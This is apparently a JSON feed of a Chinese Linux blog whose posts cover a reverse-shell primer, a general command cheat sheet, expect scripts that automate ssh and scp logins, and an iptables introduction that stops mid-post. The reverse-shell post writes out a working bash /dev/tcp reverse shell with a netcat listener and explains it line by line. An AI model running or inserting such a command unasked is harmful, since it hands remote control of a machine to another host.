{
    "version": "https://jsonfeed.org/version/1",
    "title": "SnowRoll Blog • All posts by \"linux\" tag",
    "description": "分享经验，记录生活",
    "home_page_url": "https://snowroll.github.io",
    "items": [
        {
            "id": "https://snowroll.github.io/reverse-shell/",
            "url": "https://snowroll.github.io/reverse-shell/",
            "title": "反向shell",
            "date_published": "2022-08-13T07:05:11.000Z",
            "content_html": "<h1 id=\"什么是反向shell\"><a class=\"markdownIt-Anchor\" href=\"#什么是反向shell\">#</a> 什么是反向 shell</h1>\n<p>我们在客户端 A 通过 <code>ssh</code>  命令连接服务器 B，从而得到服务器 B 的终端命令行，客户端主动发起的这次连接过程我们称为正向 shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh test@10.10.10.1 </span><br></pre></td></tr></table></figure>\n<p>顾名思义，反向 shell 应该由服务器端 B 主动发起，而客户端 A 被动监听，接收这次连接。</p>\n<p>客户端 A （假设 ip 为 1.2.3.4）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 打开一个端口，监听连接请求</span></span><br><span class=\"line\">nc -lvvp 2333</span><br></pre></td></tr></table></figure>\n<p>nc（netcat）是 linux 中一个功能强大的网络命令行工具，常用于端口扫描，端口监听。</p>\n<p>参数说明：</p>\n<ul>\n<li>-l 使用监听模式</li>\n<li>-vv verbose，使用两次会有更多信息</li>\n<li>-p 本地端口</li>\n</ul>\n<p>客户端 A 打开了本地端口 2333，来监听连接请求。因此，我们只需要在服务器端 B 发起一个连接请求，将 B 的 shell 的输入输出发送过来即可完成反向 shell</p>\n<p>服务器端 B</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/1.2.3.4/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>这样就可以成功将 B 的 shell 命令行发送给 A，实现反向 shell</p>\n<p>参考文章： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84MGQ2YjVhNjEzNzI=\">https://www.jianshu.com/p/80d6b5a61372</span></p>\n<p>命令详解：</p>\n<ul>\n<li>bash 命令行</li>\n<li>-i 交互模式</li>\n<li>&gt;&amp; 输出重定向，1 &gt; 可以省略为 &gt;，将标准输出和标准错误输出都重定向到远程。 文件的三种状态，0 标准输入， 1 标准输出， 2 错误输出</li>\n<li>/dev/tcp/${host}/${port} 建立一个 socket 连接，连接到其他机器</li>\n<li>0&gt;&amp;1 标准输入重定向到标准输出，由于标准输出已经定向到了远端机器上，所以输入、输出都将定向到远端机器上，实现了反向 shell</li>\n</ul>\n<p>由于 Linux 下一切皆文件，所以可以使用 <code>/dev/tcp</code>  创建一个 socket 套接字，而 <code>/$&#123;host&#125;/$&#123;port&#125;</code>  则是传入的参数。</p>\n<h1 id=\"反向shell工具\"><a class=\"markdownIt-Anchor\" href=\"#反向shell工具\">#</a> 反向 shell 工具</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ3NvY2tldC5pby9kZXBsb3kv\">gsocket.io</span></p>\n<h2 id=\"可能的问题\"><a class=\"markdownIt-Anchor\" href=\"#可能的问题\">#</a> 可能的问题</h2>\n<ul>\n<li>\n<p>shell 反弹失败</p>\n<p>可能原因 1:</p>\n<p>ubuntu 系统打开的终端默认为 <code>sh</code> ，而 <code>sh</code>  实际指向的是非交互式终端  <code>dash</code> ，需要先切换到 <code>bash</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bach -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>-c 执行 command string</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "linux",
                "reverse-shell"
            ]
        },
        {
            "id": "https://snowroll.github.io/linux-commands/",
            "url": "https://snowroll.github.io/linux-commands/",
            "title": "linux常用命令汇总",
            "date_published": "2022-07-28T02:35:04.000Z",
            "content_html": "<ol>\n<li><strong>强制命令模式执行： <code>:w !sudo tee %</code> </strong></li>\n</ol>\n  <figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">w： 表示保存文件</span><br><span class=\"line\">！： 表示执行外部命令</span><br><span class=\"line\">tee： linux命令，这个有点复杂，可以查看linux命令帮助</span><br><span class=\"line\">%： 在执行外部命令时，%会扩展成当前文件名；这个%区别于替换时的%，替换时%的意义是代表整个文件，而不是文件名</span><br><span class=\"line\"></span><br><span class=\"line\"># 只读文件，不修改强制退出</span><br><span class=\"line\">q!</span><br></pre></td></tr></table></figure>\n<p>上述方式非常完美的解决了不能保存只读文件的问题，但毕竟命令还是有些长，为了避免每次输入一长串的命令，可以将它映射为一个简单的命令加到 .vimrc 中：</p>\n  <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; Allow saving of files as sudo when I forgot to start vim using sudo.</span><br><span class=\"line\"> cmap w!! w !sudo tee &gt; /dev/null %</span><br></pre></td></tr></table></figure>\n<p>这样，简单的运行:w!! 即可。命令后半部分 &gt; /dev/null 作用为显式的丢掉标准输出的内容。</p>\n<ol start=\"2\">\n<li><strong>删除大量文件</strong></li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjQ3Mjkw\">Linux 下删除大量文件效率对比，看谁删的快！</span></p>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 首先建立空文件夹blanktest</span></span><br><span class=\"line\">$ time rsync -a --delete blanktest/ <span class=\"built_in\">test</span>/</span><br><span class=\"line\">rsync -a --delete blanktest/ <span class=\"built_in\">test</span>/  0.59s user 7.86s system 51% cpu 16.418 total</span><br><span class=\"line\">16s，很好很强大。</span><br></pre></td></tr></table></figure>\n<ol>\n<li>查看磁盘可用空间</li>\n</ol>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">df -h  <span class=\"comment\"># 查看磁盘可用空间</span></span><br><span class=\"line\">du -h --max-depth=1  ./  <span class=\"comment\"># 查看当前目录及其目录的文件大小</span></span><br><span class=\"line\">du -sh ./  <span class=\"comment\"># 查看当前目录总大小</span></span><br></pre></td></tr></table></figure>\n<ol>\n<li>apt-get 下载失败 <strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8zNjMyMDAvZS11bmFibGUtdG8tY29ycmVjdC1wcm9ibGVtcy15b3UtaGF2ZS1oZWxkLWJyb2tlbi1wYWNrYWdlcw==\">E: Unable to correct problems, you have held broken packages</span></strong></li>\n</ol>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 改用aptitude，更加方便智能</span></span><br><span class=\"line\">sudo apt-get install aptitude</span><br><span class=\"line\">aptitude get install yourpkg</span><br></pre></td></tr></table></figure>\n<ol>\n<li>\n<p>查看进程</p>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 特定用户的特定进程</span></span><br><span class=\"line\">ps -u root -ef | grep consume </span><br><span class=\"line\"><span class=\"comment\"># kill特定用户的所有进程</span></span><br><span class=\"line\"><span class=\"comment\"># 1. 打印出所有pid，再kill</span></span><br><span class=\"line\">ps -ef | grep ttlsa | awk <span class=\"string\">&#x27;&#123; print $2 &#125;&#x27;</span> | sudo xargs <span class=\"built_in\">kill</span> -9</span><br><span class=\"line\"><span class=\"comment\"># 2. -v --invert-match 显示不包含匹配文本的所有行</span></span><br><span class=\"line\">ps -ef | grep dynamic.sh | grep -v grep | awk <span class=\"string\">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class=\"built_in\">kill</span> -9</span><br><span class=\"line\"><span class=\"comment\"># 3. pgrep -u参数查出用户的所有pid，然后依次kill</span></span><br><span class=\"line\">pgrep -u ttlsa | sudo xargs <span class=\"built_in\">kill</span> -9</span><br><span class=\"line\"><span class=\"comment\"># 查看进程 -e 显示系统内所有进程信息 -l long 长格式显示 -f full 完整显示</span></span><br><span class=\"line\">ps -elf</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>ps -aux 解释</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#   user     pid  cpu mem  vsz   rss  tty  stat start time command</span></span><br><span class=\"line\">&gt;&gt; chaihua+ 26879 0.0 0.0 112820 968 pts/47 S+  15:49 0:00 grep --color=auto chaihuajun</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th>列名</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>USER</td>\n<td>进程的拥有者用户名</td>\n</tr>\n<tr>\n<td>PID</td>\n<td>进程的 ID</td>\n</tr>\n<tr>\n<td>%CPU</td>\n<td>该进程使用 CPU 资源的百分比</td>\n</tr>\n<tr>\n<td>%MEM</td>\n<td>该进程使用内存资源的百分比</td>\n</tr>\n<tr>\n<td>VSZ</td>\n<td>进程使用的虚拟内存大小</td>\n</tr>\n<tr>\n<td>RSS</td>\n<td>进程使用的实际内存大小</td>\n</tr>\n<tr>\n<td>TTY</td>\n<td>进程所绑定的终端</td>\n</tr>\n<tr>\n<td>STAT</td>\n<td>进程的状态</td>\n</tr>\n<tr>\n<td>START</td>\n<td>进程的启动时间</td>\n</tr>\n<tr>\n<td>TIME</td>\n<td>该进程占用 CPU 时间的累计值</td>\n</tr>\n<tr>\n<td>COMMAND</td>\n<td>进程所对应的命令</td>\n</tr>\n</tbody>\n</table>\n<p>其中， <code>-u</code>  参数指定了只显示与当前用户相关的进程，而  <code>x</code>  参数指定了显示所有进程，包括没有控制终端的进程。</p>\n</li>\n</ul>\n</li>\n<li>\n<p>查看内存</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   </span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>更改文件夹权限及用户</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -R 递归 修改文件所有者</span></span><br><span class=\"line\">chown [-R] username dirname/filename</span><br><span class=\"line\"><span class=\"comment\"># 修改文件所在群组</span></span><br><span class=\"line\">chgrp [-R] groupname dirname/filename</span><br><span class=\"line\"><span class=\"comment\"># 查看用户组</span></span><br><span class=\"line\">cat /etc/group</span><br><span class=\"line\"><span class=\"comment\"># 创建群组</span></span><br><span class=\"line\">groupadd groupName</span><br><span class=\"line\"><span class=\"comment\"># 将用户添加到指定组 -a append -G 将一个用户添加到多个群组</span></span><br><span class=\"line\">usermod -a -G groupA user</span><br><span class=\"line\"><span class=\"comment\"># 修改访问权限</span></span><br><span class=\"line\"><span class=\"comment\"># ll 查看文件属性</span></span><br></pre></td></tr></table></figure>\n<p>drwxrw-r–</p>\n<ul>\n<li>d 属性</li>\n<li>rwx 所有者权限</li>\n<li>rw- 群组用户权限</li>\n<li>r-- 其他用户权限</li>\n</ul>\n<p><code>chmod</code>  用数字修改文件访问权限，绝对权限</p>\n<table>\n<thead>\n<tr>\n<th>权限</th>\n<th>数字</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>r</td>\n<td>4</td>\n</tr>\n<tr>\n<td>w</td>\n<td>2</td>\n</tr>\n<tr>\n<td>x</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n<p><code>chmod</code>  用字母分配权限，相对权限</p>\n<table>\n<thead>\n<tr>\n<th>字母</th>\n<th>含义</th>\n<th>符号</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>u</td>\n<td>所有者</td>\n<td>+</td>\n<td>添加权限</td>\n</tr>\n<tr>\n<td>g</td>\n<td>群组用户</td>\n<td>-</td>\n<td>移除权限</td>\n</tr>\n<tr>\n<td>o</td>\n<td>其他用户</td>\n<td>=</td>\n<td>分配权限</td>\n</tr>\n<tr>\n<td>a</td>\n<td>所有用户</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p><code>chmod g+rx file</code>   给群组用户添加可读、可执行权限</p>\n</li>\n<li>\n<p>ssh 配置公私钥</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS9seHcxODQ0OTEyNTE0LzI5NDA3Mjc=\">参考链接：公私钥配置</span></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 生成公私钥对 -t 密钥类型 -c 注释文字</span></span><br><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">&#x27;chaihj15@163.com&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># .ssh下找到id_rsa.pub 上传到服务器</span></span><br><span class=\"line\"><span class=\"comment\"># 追加到服务器ssh认证文件中</span></span><br><span class=\"line\">cat /xxx/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果没有authorized_keys，创建&amp;赋予600权限</span></span><br><span class=\"line\">touch authorized_keys</span><br><span class=\"line\">chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>\n<p>本机创建～/.ssh/config</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host            alias            #自定义别名</span><br><span class=\"line\">HostName        114.11.11.110         #替换为你的ssh服务器ip或domain</span><br><span class=\"line\">Port            22             #ssh服务器端口，默认为22</span><br><span class=\"line\">User            root             #ssh服务器用户名</span><br><span class=\"line\">IdentityFile    ~&#x2F;.ssh&#x2F;id_rsa    #第一个步骤生成的公钥文件对应的私钥文件</span><br></pre></td></tr></table></figure>\n<p>更改权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 600 config</span><br></pre></td></tr></table></figure>\n<p>运行，愉快登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh alias</span><br></pre></td></tr></table></figure>\n<p>有些服务器默认不支持密钥登陆，需要修改 <code>/etc/ssh/sshd_config</code>  配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">去掉<span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#PubkeyAuthentication yes</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>发现本机 ip</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl ifconfig.me</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n",
            "tags": [
                "linux",
                "shell"
            ]
        },
        {
            "id": "https://snowroll.github.io/shell-except/",
            "url": "https://snowroll.github.io/shell-except/",
            "title": "shell-except",
            "date_published": "2020-10-21T14:57:55.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>except 简介</li>\n<li>利用 except，向服务器传输文件 &amp; ssh 登录服务器</li>\n</ul>\n<a id=\"more\"></a>\n<h4 id=\"1-except简介\"><a class=\"markdownIt-Anchor\" href=\"#1-except简介\">#</a> 1. except 简介</h4>\n<ul>\n<li>\n<p>except 的安装</p>\n<p>Mac:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install expect</span><br></pre></td></tr></table></figure>\n<p>Linux:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install expect</span><br></pre></td></tr></table></figure>\n<p>压缩包安装</p>\n<p>参考博客： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC85NDJiODAxNzU3ZGU=\">https://www.jianshu.com/p/942b801757de</span></p>\n</li>\n<li>\n<p>简介</p>\n<p>shell 脚本功能非常强大，可以帮助我们自动完成很多繁琐的工作。但是对于登录服务器这种需要自动交互的过程，shell 就有些力不从心，except 可以完美解决这一需求。</p>\n<p>参考博客： Linux expect 用法 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMHhjYWZlZGFkZHkvcC83MTQ3MDUxLmh0bWw=\">https://www.cnblogs.com/0xcafedaddy/p/7147051.html</span></p>\n<p>expect 脚本使用 <span class=\"exturl\" data-url=\"aHR0cDovL2VpbnZlcm5lLmdpdGh1Yi5pby9wb3N0LzIwMTkvMDEvZXhwZWN0LWNvbW1hbmQuaHRtbCMlRTUlODUlQjMlRTklOTQlQUUlRTUlOTElQkQlRTQlQkIlQTQ=\">http://einverne.github.io/post/2019/01/expect-command.html# 关键命令</span></p>\n<p>expect - 自动交互脚本 <span class=\"exturl\" data-url=\"aHR0cDovL3hzdGFyY2QuZ2l0aHViLmlvL3dpa2kvc2hlbGwvZXhwZWN0Lmh0bWw=\">http://xstarcd.github.io/wiki/shell/expect.html</span></p>\n<ul>\n<li>\n<p>四个重要的命令</p>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>spawn</td>\n<td>启动新的进程，输出可以被 expect 所捕获</td>\n</tr>\n<tr>\n<td>expect</td>\n<td>从进程接收字符串，期望获得字符串</td>\n</tr>\n<tr>\n<td>send</td>\n<td>向进程发送字符串，模拟用户输入，注意添加 <code>\\r</code>  回车</td>\n</tr>\n<tr>\n<td>interact</td>\n<td>允许用户与进程交互</td>\n</tr>\n</tbody>\n</table>\n</li>\n<li>\n<p>简单示例  <code>demo.sh</code></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/except</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">set</span> timeout 10;  <span class=\"comment\"># 设置程序超时时间</span></span><br><span class=\"line\">spawn ssh root@10.10.10.11  <span class=\"comment\"># ssh连接服务器</span></span><br><span class=\"line\">expect <span class=\"string\">&quot;password&quot;</span>  <span class=\"comment\"># 判断进程输出中是否有&quot;password&quot;</span></span><br><span class=\"line\">send <span class=\"string\">&quot;your_password\\r&quot;</span>  <span class=\"comment\"># 将密码输入 \\r是回车 </span></span><br><span class=\"line\">interact  <span class=\"comment\"># 保持与服务器端的连接</span></span><br></pre></td></tr></table></figure>\n<p>运行方法:  <code>except demo.sh</code></p>\n<p>\\r \\n 的区别： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8yMzgwNGIwYjAzYzg=\">https://www.jianshu.com/p/23804b0b03c8</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2-向服务器传输文件ssh登录服务器自动化脚本\"><a class=\"markdownIt-Anchor\" href=\"#2-向服务器传输文件ssh登录服务器自动化脚本\">#</a> 2. 向服务器传输文件 &amp; ssh 登录服务器自动化脚本</h4>\n<ul>\n<li>\n<p>except 与 shell 脚本结合</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"meta\">#!/usr/bin/expect</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 自动上传文件到服务器</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">auto_scp</span></span>()&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\"># -c: 执行脚本前先执行的命令</span></span><br><span class=\"line\">    expect -c <span class=\"string\">&quot;set timeout -1; </span></span><br><span class=\"line\"><span class=\"string\">            spawn scp yourfile root@10.10.10.10:/target_dir/</span></span><br><span class=\"line\"><span class=\"string\">            expect &#123;</span></span><br><span class=\"line\"><span class=\"string\">                \\&quot;yes/no\\&quot; &#123; send \\&quot;yes\\n\\&quot;; exp_continue&#125;</span></span><br><span class=\"line\"><span class=\"string\">                \\&quot;password\\&quot; &#123; send \\&quot;yourpasswd\\n\\&quot; &#125;  # \\n 和 \\r 均可以</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            interact</span></span><br><span class=\"line\"><span class=\"string\">            &quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ssh登录服务器</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">auto_ssh_restart</span></span>() &#123;</span><br><span class=\"line\">    expect -c <span class=\"string\">&quot;set timeout -1;</span></span><br><span class=\"line\"><span class=\"string\">            spawn ssh root@10.10.10.10</span></span><br><span class=\"line\"><span class=\"string\">            expect \\&quot;password\\&quot; </span></span><br><span class=\"line\"><span class=\"string\">            send \\&quot;yourpassword\\r\\&quot;</span></span><br><span class=\"line\"><span class=\"string\">            expect \\&quot;]#\\&quot; &#123; send \\&quot;pwd\\n\\&quot; &#125; </span></span><br><span class=\"line\"><span class=\"string\">            interact&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">auto_scp</span><br><span class=\"line\">auto_ssh_restart</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<center>点绛唇·途中逢管倅\n<center> 憔悴天涯，故人相遇情如故。别离何遽，忍唱阳关句！</center>\n<center>我是行人，更送行人去。愁无据。寒蝉鸣处，回首斜阳暮。</center>\n",
            "tags": [
                "linux",
                "shell",
                "except"
            ]
        },
        {
            "id": "https://snowroll.github.io/iptables/",
            "url": "https://snowroll.github.io/iptables/",
            "title": "iptables 简介",
            "date_published": "2020-10-08T12:00:00.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>iptables 相关概念介绍</li>\n<li>iptables 相关命令</li>\n<li>常用命令解析</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"一-iptables相关概念介绍\"><a class=\"markdownIt-Anchor\" href=\"#一-iptables相关概念介绍\">#</a> 一、 iptables 相关概念介绍</h3>\n<ul>\n<li>\n<p>参考的博客链接 https://aimuke.github.io/linux/2019/05/28/iptables/</p>\n</li>\n<li>\n<p>功能简介</p>\n<p>根据管理员定义的规则 <code>rules</code>  对数据包进行过滤，在 <code>rules</code>  中可以指定数据包的 <code>源地址</code> 、 <code>目标地址</code> 、 <code>协议类型</code> 等，过滤操作包括 <code>ACCEPT</code> 、 <code>REJECT</code> 、 <code>DROP</code>  和 <code>LOG</code>  等等。</p>\n</li>\n<li>\n<p>Chain</p>\n<p>针对数据包的不同流向，又设置了不同的关卡，术语为 <code>Chain(链)</code> 。当数据包的目标主机为本机时使用 <code>INPUT</code> ，需要经过本机转发给其他服务器使用 <code>FORWORD</code> ，本机数据包发送出去使用 <code>OUTPUT</code> 。还有 <code>PREROUTING</code>  和 <code>POSTROUTING</code> ，下面这张图能够很好地说明几个链所处的位置，图片来源见水印</p>\n<p><img data-src=\"http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png\" alt=\"a\"></p>\n</li>\n<li>\n<p>table</p>\n<p>不同的规则会对数据包进行不同的操作，相同功能的规则会构成一个 <code>table(表)</code> ， <code>iptables</code>  提供的表如下所示</p>\n<table>\n<thead>\n<tr>\n<th>表名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>filter</td>\n<td>过滤，防火墙  内核模块： iptables_filter</td>\n</tr>\n<tr>\n<td>nat</td>\n<td>网络地址转换 内核模块： iptable_nat</td>\n</tr>\n<tr>\n<td>mangle</td>\n<td>拆解报文，做出修改，并重新封装 内核模块： iptable_mangle</td>\n</tr>\n<tr>\n<td>raw</td>\n<td>关闭 nat 表上启用的连接追踪功能 内核模块： iptable_raw</td>\n</tr>\n</tbody>\n</table>\n</li>\n<li>\n<p>Chain 和 table</p>\n<p>不同的链中包含不同的表，不同的表执行有优先级，具体可见下图（来源见水印）</p>\n<img data-src=\"http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png\" alt=\"aa\" style=\"zoom:%;\" />\n</li>\n</ul>\n<h3 id=\"二-相关命令\"><a class=\"markdownIt-Anchor\" href=\"#二-相关命令\">#</a> 二、 相关命令</h3>\n<ul>\n<li>\n<p>基本命令</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo iptables -L</span><br></pre></td></tr></table></figure>\n<p>列出目前 <code>iptables</code>  中的规则，对于新建立的服务器，没有任何规则，结果如下</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Chain INPUT (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br><span class=\"line\"></span><br><span class=\"line\">Chain FORWARD (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br><span class=\"line\"></span><br><span class=\"line\">Chain OUTPUT (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>命令参数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 